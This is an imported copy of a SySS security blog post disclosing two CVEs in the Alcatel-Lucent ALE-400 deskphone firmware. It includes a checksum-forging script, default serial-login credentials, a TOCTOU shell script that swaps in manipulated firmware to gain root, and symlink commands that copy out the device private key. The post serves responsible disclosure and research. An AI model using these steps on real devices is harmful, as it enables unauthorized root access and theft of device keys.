---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-07-12_firmware-security-alcatel-lucent-ale-deskphone.md
original_filename: 2024-07-12_firmware-security-alcatel-lucent-ale-deskphone.md
title: 'Firmware Security: Alcatel-Lucent ALE-DeskPhone'
category: documents
detected_topics:
- race-condition
- access-control
- command-injection
- otp
- api-security
tags:
- imported
- documents
- race-condition
- access-control
- command-injection
- otp
- api-security
language: en
raw_sha256: c0134b0dbd47dfb0fae33f91cacc9704e3b7fd1ee24d283404695f89ba98bc54
text_sha256: 84854e7e941a8a8aca6eb06beeb8482c4d06081431552e114ea83ecb3901689e
ingested_at: '2026-06-28T07:32:35Z'
sensitivity: unknown
redactions_applied: true
---

# Firmware Security: Alcatel-Lucent ALE-DeskPhone

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-07-12_firmware-security-alcatel-lucent-ale-deskphone.md
- Source Type: markdown
- Detected Topics: race-condition, access-control, command-injection, otp, api-security
- Ingested At: 2026-06-28T07:32:35Z
- Redactions Applied: True
- Raw SHA256: `c0134b0dbd47dfb0fae33f91cacc9704e3b7fd1ee24d283404695f89ba98bc54`
- Text SHA256: `84854e7e941a8a8aca6eb06beeb8482c4d06081431552e114ea83ecb3901689e`


## Content

---
title: "Firmware Security: Alcatel-Lucent ALE-DeskPhone"
page_title: "Firmware Security: Alcatel-Lucent ALE-DeskPhone | SySS Tech Blog"
url: "https://blog.syss.com/posts/voip-deskphone-firmware-security/"
final_url: "https://blog.syss.com/posts/voip-deskphone-firmware-security/"
authors: ["Moritz Abrell (@moritz_abrell)"]
programs: ["Alcatel-Lucent"]
bugs: ["VoIP hacking", "Hardware hacking", "Reverse engineering", "Arbitrary file read", "TOCTOU", "Local Privilege Escalation"]
publication_date: "2024-07-12"
added_date: "2024-07-22"
source: "pentester.land/writeups.json"
original_index: 168
---

This blog post is about an analysis of firmware security in a VoIP deskphone. This analysis ties in with our previous research and the demonstrated exploitation of zero touch deployments (see [Zero Touch Pwn](https://blog.syss.com/posts/zero-touch-pwn/)).

# Introduction

As we described in the blog post [Zero Touch Pwn](https://blog.syss.com/posts/zero-touch-pwn/) and demonstrated at [BlackHat USA 2023](https://www.blackhat.com/us-23/briefings/schedule/#zero-touch-pwn-abusing-zooms-zero-touch-provisioning-for-remote-attacks-on-desk-phones-31341), inadequate firmware security of Voice-over-IP (VoIP) devices can lead to a major security risk. With this in mind, we conducted an in-depth analysis of another device to identify potential security vulnerabilities.

In this blog post, we descibe the security analysis of the ALE DeskPhone (ALE-400), manufactured and developed by Alcatel-Lucent Enterprise.

# Alcatel ALE DeskPhone

We analyzed the firmware of an Alcatel-Lucent [ALE-400](https://www.al-enterprise.com/en/products/devices/ale-deskphones) VoIP DeskPhone:

![ALE-400](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7) _ALE-400_

This analysis was carried out from a black box perspective, as we only had access to two firmware update files and the device itself.

# Firmware Analysis

The ALE DeskPhones support two modes:

  1. The native mode with the proprietary New Office Environment (NOE) protocol, e.g. firmware `86x8_NOE-R300.1.40.012.4140-signed.zip`
  2. The SIP mode with the well-known Session Initiation Protocol (SIP), e.g. firmware `86x8_SIP-R200.1.01.10.728-signed.zip`

Depending on the firmware, the ZIP archive contains different binary files. The following output exemplarily shows the content of the NOE firmware file `86x8_NOE-R300.1.40.12.4180-signed.zip`.

`
  
  
  1
  2
  3
  4
  5
  6
  7
  8
  9
  10
  11
  12
  13
  14
  15
  16
  17
  

| 
  
  
  $ 7z l 86x8_NOE-R300.1.40.12.4180-signed.zip
  
  Listing archive: 86x8_NOE-R300.1.40.12.4180-signed.zip
  
  --
  Path = 86x8_NOE-R300.1.40.12.4180-signed.zip
  Type = zip
  Physical Size = 54859102
  
  Date  Time  Attr  Size  Compressed  Name
  ------------------- ----- ------------ ------------  ------------------------
  2023-11-21 06:44:47 .....  720692  666056  bin86x8P
  2023-11-21 06:44:47 .....  256  140  bin86x8P-header
  2023-11-21 06:44:47 .....  54186236  54192140  noe86x8P
  2023-11-21 06:44:47 .....  256  140  noe86x8P-header
  ------------------- ----- ------------ ------------  ------------------------
  2023-11-21 06:44:47  54907440  54858476  4 files
  
  
---|---  
`

The content of the SIP firmware file `86x8_SIP-R200.1.01.10.728-signed.zip` is shown in the following output.

`
  
  
  1
  2
  3
  4
  5
  6
  7
  8
  9
  10
  11
  12
  13
  14
  15
  

| 
  
  
  $ 7z l 86x8_SIP-R200.1.01.10.728-signed.zip
  
  Listing archive: 86x8_SIP-R200.1.01.10.728-signed.zip
  
  --
  Path = 86x8_SIP-R200.1.01.10.728-signed.zip
  Type = zip
  Physical Size = 57490311
  
  Date  Time  Attr  Size  Compressed  Name
  ------------------- ----- ------------ ------------  ------------------------
  2023-09-22 08:22:56 .....  57483608  57489849  sip86x8P
  2023-09-22 08:22:56 .....  256  138  sip86x8P-header
  ------------------- ----- ------------ ------------  ------------------------
  2023-09-22 08:22:56  57483864  57489987  2 files
  
  
---|---  
`

The firmware structure of the different operating modes is the same, as described later. Therefore, only one operating mode is covered here.

## Firmware structure

The first interesting fact is that in addition to a comparatively larger file, there is also a file with the suffix `-header` with a fixed size of 256 bytes.

When analyzing the first few bytes of a binary file, e.g. `sip86x8P`, we found that the first 256 bytes correspond to the content of this header file (`sip86x8P-header`), as the following output illustrates.

`
  
  
  1
  2
  3
  4
  5
  6
  7
  8
  9
  10
  11
  12
  13
  14
  15
  16
  17
  

| 
  
  
  diff -y <(xxd -l 256 sip86x8P) <(xxd sip86x8P-header)
  00000000: 0c1f 0000 0000 0000 5820 6d03 6d6a 1951  ........X  00000000: 0c1f 0000 0000 0000 5820 6d03 6d6a 1951  ........X
  00000010: 405b 7369 7038 3678 3850 5f31 2e30 312e  @[sip86x8P  00000010: 405b 7369 7038 3678 3850 5f31 2e30 312e  @[sip86x8P
  00000020: 3130 5f32 3153 6570 3233 5f31 3968 3039  10_21Sep23  00000020: 3130 5f32 3153 6570 3233 5f31 3968 3039  10_21Sep23
  00000030: 0046 5200 0000 0000 494c 4c4b 4952 4348  .FR.....IL  00000030: 0046 5200 0000 0000 494c 4c4b 4952 4348  .FR.....IL
  00000040: 7272 7272 7272 7272 7272 7272 7272 7272  rrrrrrrrrr  00000040: 7272 7272 7272 7272 7272 7272 7272 7272  rrrrrrrrrr
  00000050: 7272 7272 7272 7272 7272 7272 7272 7200  rrrrrrrrrr  00000050: 7272 7272 7272 7272 7272 7272 7272 7200  rrrrrrrrrr
  00000060: 7369 7038 3678 3850 5f52 785f 5f5f 5f5f  sip86x8P_R  00000060: 7369 7038 3678 3850 5f52 785f 5f5f 5f5f  sip86x8P_R
  00000070: 4445 465f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f  DEF_______  00000070: 4445 465f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f  DEF_______
  00000080: 6363 6363 6363 6363 6363 6363 6363 6300  cccccccccc  00000080: 6363 6363 6363 6363 6363 6363 6363 6300  cccccccccc
  00000090: 7369 7038 3678 3850 5f52 785f 5f5f 5f5f  sip86x8P_R  00000090: 7369 7038 3678 3850 5f52 785f 5f5f 5f5f  sip86x8P_R
  000000a0: 7070 7070 7070 7070 7070 7070 7070 7000  pppppppppp  000000a0: 7070 7070 7070 7070 7070 7070 7070 7000  pppppppppp
  000000b0: 0000 aac8 1f6d 031d e496 0b31 2e30 312e  .....m....  000000b0: 0000 aac8 1f6d 031d e496 0b31 2e30 312e  .....m....
  000000c0: 3130 3230 3233 3039 3231 3139 3039 0000  1020230921  000000c0: 3130 3230 3233 3039 3231 3139 3039 0000  1020230921
  000000d0: 0000 11c8 1f6d 0300 0100 0044 6000 0000  .....m....  000000d0: 0000 11c8 1f6d 0300 0100 0044 6000 0000  .....m....
  000000e0: c820 6d03 ee00 0000 0028 216d 0300 0000  . m......(  000000e0: c820 6d03 ee00 0000 0028 216d 0300 0000  . m......(
  000000f0: 0000 0000 0000 3732 3800 0000 0000 0053  ......728.  000000f0: 0000 0000 0000 3732 3800 0000 0000 0053  ......728.
  
  
---|---  
`

It is therefore obvious that this is meta data or, as the file name already suggests, the header of the firmware. We will go into the structure of the header in more detail later.

The first 256 bytes are followed by the magic bytes `FD 37 7A 58 5A 00`, which indicate XZ compression:

`
  
  
  1
  2
  

| 
  
  
  $ xxd -s +256 -l 16 sip86x8P
  00000100: fd37 7a58 5a00 0004 e6d6 b446 0200 2101  .7zXZ......F..!.
  
  
---|---  
`

As a next step, we decompressed the XZ-compressed data, resulting in a ~184 MB TAR archive and the remaining 144 bytes that are not yet known:

`
  
  
  1
  2
  3
  4
  5
  6
  7
  8
  9
  10
  

| 
  
  
  $ xxd -s -144 sip86x8P
  036d20c8: 471a 3fea 80c0 f868 55ef 656b c82b 9984  G.?....hU.ek.+..
  036d20d8: 855a 8d6d 4c8c 3035 fe2f fd28 41fc e721  .Z.mL.05./.(A..!
  036d20e8: bfda 1efd 1d20 ac0d 50aa 5d98 339a ac21  ..... ..P.].3..!
  036d20f8: 2185 5197 2f17 0b61 9a24 948c 182d 4493  !.Q./..a.$...-D.
  036d2108: 3ab9 2764 645f 8b65 46e5 4ab6 f276 a13f  :.'dd_.eF.J..v.?
  036d2118: be26 d16d a3f8 6494 399b d805 4ae1 709c  .&.m..d.9...J.p.
  036d2128: a892 fd8f e94e 36b6 32aa c472 84e3 3747  .....N6.2..r..7G
  036d2138: 73b0 00ba 8d2e 103d 2a2d 167a 5b71 5b00  s......=*-.z[q[.
  036d2148: 2bdd 7613 1d39 51b4 27c4 3ff2 b6b3 30ad  +.v..9Q.'.?...0.
  
  
---|---  
`

The TAR archive, on the other hand, contains the phone’s unencrypted root file system, as the following output demonstrates.

`
  
  
  1
  2
  3
  4
  5
  6
  7
  8
  9
  10
  11
  12
  13
  14
  15
  16
  17
  18
  19
  20
  21
  22
  23
  

| 
  
  
  $ tar --exclude="*/*/*" -tf data.tar
  ./
  ./css/
  ./sbin/
  ./proc/
  ./mnt/
  ./boot/
  ./tmp
  ./etc/
  ./bin/
  ./sys/
  ./usr/
  ./run/
  ./media/
  ./config/
  ./home/
  ./dev/
  ./lib/
  ./linuxrc
  ./root/
  ./config-fab/
  ./var/
  ./data/
  
  
---|---  
`

## Analysis of the update process

Since the root file system itself is not encrypted, we analyzed the firmware to get an idea of how the update process works.

In the phone’s user interface, we found a function called `Upgrade via USB`. As the phone does not offer administrative network services such as a web server, we decided to look specifically for the USB update process.

The identified USB update process can be summarized as follows:

  1. The script `/usr/sbin/upgrade_usb.sh` is called via the UI function.
  2. The USB drive must contain a directory called `upgrade` in which the upgrade binaries are located.
  3. The ARM binary file `/usr/sbin/dhs3_hd_parse` parses the firmware header.
  4. If the firmware version does not match the installed one, the script `/usr/sbin/debug/dwl` is called.
  5. The script `/usr/lib/upgrade/update_notify` is called.
  6. The script `/usr/sbin/upgrade.sh` is called, which appears to be the main script for the upgrade.

## Header structure

After we determined that the ARM binary `/usr/sbin/dhs3_hd_parse` is used to parse the 256-byte header, we decided to analyze it using [Ghidra](https://ghidra-sre.org/) in order to get a better understanding of the header structure.

We then were able to identify the most important parts of the firmware header, as the following figure illustrates.

![Devices Overview](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7) _Firmware header structure_

In addition to some meta data, the header also contains length fields and checksums:

  * Length field at offset `0x08`: The length of the file without the header
  * Length field at offset `0xB3`: The length of the compressed root file system
  * Checksum at offset `0x0C`: Checksum of the file
  * Checksum at offset `0xB7`: Checksum of the compressed root file system

We found out that the length fields and the checksums are actually checked and taken into account by the update process. Therefore, we had to find out how the checksums are calculated.

### Checksums

As described in the previous section, the header contains two checksums: a checksum for the entire upgrade file and a checksum for the XZ-compressed data (root file system).

The checksum calculation is performed by the ARM executable `/usr/sbin/upgrade_check` and called by the script `/usr/sbin/upgrade.sh`, as the following code excerpt shows.

![Calling upgrade_check for checksum calculation](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7) _Calling`upgrade_check` for checksum calculation_

While reversing this binary in Ghidra, we figured out, that the function at offset `0x000117e4` is responsible for the checksum calculation.

![Function graph of checksum calculation](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7) _Function graph of checksum calculation_

Now, that we had an understanding of the checksum calculation, we conducted dynamic analyses using emulation via [QEMU](https://www.qemu.org/) to confirm our results.

The following figure shows the first function call during a checksum calculation.

![Inital function call for checksum calculation](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7) _Inital function call for checksum calculation_

Explanation of the function call:

  * First parameter (see register `r0`): Seed or initialization vector with the value `0x0`
  * Second parameter (see register `r1`): Pointer to the data for checksum calculation
  * Third parameter (see register `r2`): Length of the data

The calculated checksum is the return value of the function (see register `r0`), as illustrated in the following figure.

![Retrun value of the function](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7) _Return value of the function_

Now for the next 1024 bytes, the calculated checksum of the previous block is used as seed, which is shown in the following figure.

![Next block to calculate](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7) _Next block to calculate_

So in summary, the checksum is calculated block by block for every 1024 bytes, where the initial seed value for the first block is `0x0`, and for all other blocks the result of the checksum calculation of the previous block.

With this gained knowledge, we developed the following Python script, which implements this checksum algorithm.

`
  
  
  1
  2
  3
  4
  5
  6
  7
  8
  9
  10
  11
  12
  13
  14
  15
  16
  17
  18
  19
  20
  21
  22
  23
  24
  25
  26
  27
  

| 
  
  
  import sys
  
  def calc_checksum(seed, data):
  if data is None:
  return 1
  
  accumulator = seed & 0xFFFF
  seed >>= 0x10
  
  for chunk_start in range(0, len(data), 1024):
  chunk_size = min(1024, len(data) - chunk_start)
  chunk = data[chunk_start : chunk_start + chunk_size]
  
  for byte_val in chunk:
  accumulator = (accumulator + byte_val) % 0xFFF1
  seed = (seed + accumulator) % 0xFFF1
  
  return (seed << 0x10) | accumulator
  
  file_path = sys.argv[1]
  seed = 0
  
  with open(file_path, "rb") as file:
  data = file.read()
  
  checksum = calc_checksum(seed, data)
  print(f"Checksum: {checksum}")
  
  
---|---  
`

Since the checksum of the entire file (first checksum in the header) starts from offset `0x10` (decimal 16), we have to split the relevant data of the firmware file accordingly, for instance using `dd`.

`
  
  
  1
  

| 
  
  
  $ dd if=sip86x8P of=sip86x8P-to-calc skip=16 bs=1
  
  
---|---  
`

Now, we are able to calculate the same checksum as listed in the original header, as the following output demonstrates.

`
  
  
  1
  2
  3
  4
  5
  6
  7
  

| 
  
  
  # Calculate the checksum:
  $ python3 checksum.py sip86x8P-to-calc
  Checksum: 1360620141
  
  # Checksum from the original header as decimal representation:
  python -c "print(int('51196a6d', 16))"
  1360620141
  
  
---|---  
`

This also works for the second checksum regarding the TAR archive containing the root file system.

`
  
  
  1
  2
  3
  4
  5
  6
  7
  

| 
  
  
  # Calculate the checksum:
  $ python3 checksum.py xz.bin
  Checksum: 194438173
  
  # Checksum from the original header as decimal representation:
  python -c "print(int('b96e41d', 16))"
  194438173
  
  
---|---  
`

During further analysis, however, we discovered that there is also a signature check in addition to the checksum. The signature is located at the end of the update file, in our case the last 144 bytes.

This Elliptic Curve Digital Signature Algorithm (ECDSA) signature is also verified by the executable `/usr/sbin/upgrade_check`.

Since we do not have access to the corresponding cryptographic signature key, we cannot sign firmware files accordingly. Thus, we are unable to simply install manipulated firmware on the device and must therefore move on to another approach.

# Getting Shell Access

During the firmware analysis, we noticed that the phone supports serial communication (UART) via USB and spawns a login shell if connected.

So, we wired up a suitable USB-to-serial adapter and logged in using the default credentials `admin:123456` extracted and cracked from the file `/etc/shadow` of the firmware.

The following figure shows the USB serial wiring.

![USB serial wiring](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7) _USB serial wiring_

A successful serial connection to the ALE-400 DeskPhone is shown in the following figure. ![USB serial connection](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7) _USB serial connection_

The following output shows a successful login as user `admin`, which turned out to be a low-privileged user account.

`
  
  
  1
  2
  3
  4
  5
  6
  7
  8
  9
  10
  11
  12
  

| 
  
  
  $ picocom --b 115200  /dev/ttyUSB0
  
  DSPG (dvf101, using Yocto/OE-Core "honister") v2.17-rc2 ALE-400-1E3430 /dev/ttySLK0
  
  ALE-400-1E3430 login: admin
  Password=***REDACTED*** v1.34.1 (2023-09-21 15:34:04 UTC) built-in shell (ash)
  Enter 'help' for a list of built-in commands.
  
  #
  
  
---|---  
`

# Race Condition

The low-privileged shell access significantly increases the attack surface, and we have found a time-of-check to time-of-use (TOCTOU) vulnerability within the firmware update process.

During the update process, the firmware image is copied from the USB drive to `/tmp/sip86x8P` on the phone. However, the file is writable for everyone, as the following output shows.

`
  
  
  1
  2
  

| 
  
  
  ls -la /tmp/sip86x8P
  -rw-rw-rw- 1 root root 57483592 Feb 22 08:55 sip86x8P
  
  
---|---  
`

The `tmp` directory has the sticky bit set, so the file cannot be deleted or replaced, but its content can be overwritten by anyone.

Combined with the fact that the firmware will run without locking the file or holding a file handle, this can be exploited after `/usr/sbin/upgrade_check` successfully validated the firmware signature and returned without an error, for example from the perspective of the default low-privileged `admin` user.

## Firmware manipulation

We extracted the firmware, modified the `/etc/passwd` file, assigned the user id `0` to the `admin` user, and additionally enabled the root account in the `/etc/shadow` file.

Afterwards, we packed the firmware, recalculated the length and checksum, and modified the firmware header accordingly, as illustrated in the following figure.

![Modified firmware header](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7) _Modified firmware header_

As a next step, we downloaded the manipulated firmware to the phone at `/tmp/sip86x8P-manipulated` and used the following shell script to exploit the TOCTOU vulnerability.

`
  
  
  1
  2
  3
  4
  5
  6
  7
  8
  9
  10
  11
  12
  13
  14
  15
  16
  17
  18
  19
  20
  21
  22
  23
  24
  25
  26
  27
  28
  

| 
  
  
  #!/bin/sh
  
  PROC_NAME="upgrade_check --signature"
  FLAG=""
  
  while true
  do
  
  if [ "$FLAG" ]
  then
  if [ "$(ps | grep "$PROC_NAME" | egrep -v 'grep')" ]
  then
  continue
  else
  echo "[*] Process finished"
  cat /tmp/sip86x8P-manipulated /tmp/sip86x8P
  echo "[+] Image overwritten"
  break
  fi
  fi
  
  if [ "$(ps | grep "$PROC_NAME" | egrep -v 'grep')" ]
  then
  echo "[*] Signature verification process found"
  FLAG="1"
  fi
  
  done
  
  
---|---  
`

Now, by providing a _good_ firmware file with a valid signature via a USB drive and initializing the update process, our script overwrites this _good_ firmware with our manipulated one, once the signature verification is done.

The following figure illustrates the execution of our proof-of-concept script.

![Execution of proof of concept script](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7) _Execution of our proof-of-concept script_

Afterwards, the manipulated firmware image is installed, and by this we successfully rooted the device, as shown in the following figures.

![Successfully installed manipulated firmware](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7) _Successfully installed manipulated firmware_

![Rooted device](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7) _Rooted device with manipulated firmware_

This vulnerability is described in our SySS security advisiory [SYSS-2024-10](https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2024-010.txt) ([CVE-2024-29149](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-29149)).

# Arbitrary File Read

We also noticed that the function `Maintenance/Debug/Get logs` available via the phones UI creates a ZIP-compressed archive of different files and logs, and stores it on the external USB drive.

Here, we identified another vulnerability concerning improper privilege management, which allows extracting sensitive and protected data from the perspective of the low-privileged `admin` user.

The directory `/data/core` is writable by the `admin` user, as the following output illustrates.

`
  
  
  1
  2
  

| 
  
  
  ls -la /data/core
  drwxrwxr-x  2 root  admin  232 Feb 19 10:51 .
  
  
---|---  
`

The content of this directory are debug files. In light of executing the debug process with root privileges, our approach involved establishing symbolic links within the scope of the low-privileged `admin` user to access protected files within this directory. Subsequently, these symbolic links are traced by the debug process and data is ultimately stored on the external USB drive.

The following output exemplarily shows creating symlinks for gaining access to a X.509 certificate and the corresponding private key.

`
  
  
  1
  2
  3
  4
  

| 
  
  
  # Symlink to the device certificate which is owned and only readable by root:
  
  $ ln -s /config-fab/fabconfig/cert/cert.pem /data/core/cert.pem
  $ ln -s /config-fab/fabconfig/cert/pkey.pem /data/core/pkey.pem
  
  
---|---  
`

After plugging in a FAT32-formated USB drive and starting the debug process via the UI, the device certificate `cert.pem` and the private key `pkey.pem` were successfully copied to our USB drive, as the following output shows.

`
  
  
  1
  2
  3
  4
  5
  6
  7
  8
  9
  10
  11
  

| 
  
  
  $ cat data/core/pkey.pem
  ***REDACTED-PRIVATE-KEY***
  
  $ cat data/core/cert.pem
  -----BEGIN CERTIFICATE-----
  MIIDDDCCAfagAwIBAgIQEDwW***REDACTED-SUSPECT-TOKEN***  [...]
  -----END CERTIFICATE-----
  
  
---|---  
`

This security vulnerability is described in our SySS security advisory [SYSS-2024-11](https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2024-011.txt) ([CVE-2024-29150](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-29150)).

# Binary Fuzzing

In addition to analyzing the firmware, we conducted binary fuzzing in [QEMU](https://www.qemu.org/) mode using [AFL++](https://github.com/AFLplusplus/AFLplusplus) for the firmware header parser `dhs3_hd_parse`, as the following figure illustrates.

![Binary Fuzzing using AFL++ in QEMU mode](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7) _Binary fuzzing using AFL++ in QEMU mode_

The fuzzing test is still ongoing as of the time of this publication, and until now, there were no interesting fuzzing results.

# Conclusion

A TOCTOU vulnerability allows a low-privileged user to perform a local privilege escalation attack on an ALE-DeskPhone. In addition, sensitive and protected files of the device can also be accessed by low-privileged users exploiting symbolic links.

The following table provides an overview of the found security vulnerabilities of the ALE-400 DeskPhone.

Vulnerability Type | SySS ID | CVE ID  
---|---|---  
Time-of-check Time-of-use (TOCTOU) Race Condition (CWE-367) | [SYSS-2024-010](https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2024-010.txt) | [CVE-2024-29149](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-29149)  
Improper Privilege Management (CWE-269) | [SYSS-2024-011](https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2024-011.txt) | [CVE-2024-29150](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-29150)  
  
As a result of our responsible disclosure of these security issues, the manufacturer provided patched firmware versions. Please see the [manufacturer note](https://www.al-enterprise.com/-/media/assets/internet/documents/n-to-s/sa-c0071-ed01.pdf) for further information.

# Special thanks

We want to thank Benjamin Pfister and [Bundesverband Telekommunikation (VAF)](https://vaf.de/) for their support and providing helpful information regarding this research project.
